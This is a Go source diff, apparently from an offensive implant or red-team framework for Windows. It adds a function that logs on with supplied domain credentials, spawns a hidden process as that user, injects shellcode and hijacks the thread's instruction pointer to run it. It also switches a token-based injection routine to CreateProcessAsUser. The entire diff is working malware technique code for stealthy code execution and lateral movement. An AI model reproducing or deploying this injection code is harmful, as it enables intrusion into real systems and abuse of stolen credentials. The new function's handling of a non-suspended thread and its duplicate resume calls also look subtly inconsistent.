@@ -196,6 +196,56 @@ func SpawnInjectReadPipeOld(shellcode []byte, args []string) (string, error) {
 }
 */
 
+func SpawnInjectWithCreds(shellcode []byte, args []string) (string, error) {
+	if len(args) < 3 {
+		return "", fmt.Errorf("Not Enough Args.")
+	}
+	domainW := args[0]
+	userW := args[1]
+	passW := args[2]
+	binaryArgsW := args[3:]
+	binaryArgs := syscall.StringToUTF16Ptr(strings.Join(binaryArgsW, " "))
+	si := &windows.StartupInfo{}
+	si.ShowWindow = winapi.ShowWindow
+	si.Flags = si.Flags | winapi.STARTF_USESHOWWINDOW
+	pi := &windows.ProcessInformation{}
+	var hToken syscall.Handle
+	ok, err := winapi.LogonUser(userW, domainW, passW, 8, 3, &hToken)
+	if !ok {
+		return "", err
+	}
+	err = windows.CreateProcessAsUser(windows.Token(hToken), nil, binaryArgs, nil, nil, false, windows.CREATE_NO_WINDOW, nil, nil, si, pi)
+	if err != nil {
+		return "", err
+	}
+	createdPid := strconv.Itoa(int(pi.ProcessId))
+	threadStart, err := RemoteInjectNoThread(shellcode, createdPid)
+	if err != nil {
+		return "", err
+	}
+	ctx := winapi.CONTEXT{}
+	ctx.ContextFlags = winapi.CONTEXT_CONTROL
+	err = winapi.GetThreadContext(uintptr(pi.Thread), &ctx)
+	if err != nil {
+		return "", err
+	}
+	ctx.Rip = winapi.DWORD64(threadStart)
+	err = winapi.SetThreadContext(uintptr(pi.Thread), &ctx)
+	if err != nil {
+		return "", err
+	}
+	_, err = windows.ResumeThread(windows.Handle(pi.Thread))
+	if err != nil {
+		return "", err
+	}
+	windows.ResumeThread(windows.Handle(pi.Thread))
+	go func() {
+		windows.WaitForSingleObject(windows.Handle(pi.Thread), windows.INFINITE)
+		windows.TerminateProcess(pi.Process, 0)
+	}()
+	return fmt.Sprintf("[+] Success Created PID %s", createdPid), nil
+}
+
 func SpawnInjectWithToken(shellcode []byte, exeToSpawn string, pidStr string) (string, error) {
 	pid, err := strconv.Atoi(pidStr)
 	if err != nil {
@@ -221,8 +271,8 @@ func SpawnInjectWithToken(shellcode []byte, exeToSpawn string, pidStr string) (s
 	if err != nil {
 		return "", err
 	}
-	res, err := winapi.CreateProcessWithTokenW(syscall.Handle(duplicatedToken), 0x00000001, exePtr, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, uintptr(winapi.NullRef), &si, &pi)
-	if !res {
+	err = windows.CreateProcessAsUser(duplicatedToken, nil, exePtr, nil, nil, false, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, nil, nil, &si, &pi)
+	if err != nil {
 		return "", err
 	}
 	createdPid := strconv.Itoa(int(pi.ProcessId))
